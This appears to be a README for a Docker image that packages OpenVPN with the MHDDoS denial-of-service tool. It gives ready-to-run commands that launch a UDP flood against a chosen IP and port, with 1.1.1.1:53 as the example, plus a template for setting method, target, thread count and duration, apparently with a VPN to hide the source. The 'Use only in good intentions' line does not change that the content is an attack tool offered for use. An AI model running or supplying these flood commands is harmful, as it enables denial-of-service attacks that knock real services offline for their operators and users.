

# Opnevpn + MHDDos container

## Requirements:
- [openvpn](https://openvpn.net/community-downloads/);
- [autovpn3](https://duckduckgo.com/?t=ffab&q=autovpn3&ia=web);
- [MHDDoS](https://github.com/MHProDev/MHDDoS);


## Examples:

### run locally after git clone:
`docker run -it --rm ddoser python3 ./start.py udp 1.1.1.1:53 10 100`

### upload from docker:
`docker run -it ndh1/ddoser:latest python3 ./start.py udp 1.1.1.1:53 10 100`

`docker run -it ndh1/ddoser:latest python3 ./start.py {method} {ip}:{port} {threds} {duration}`


### Use only in good intentions
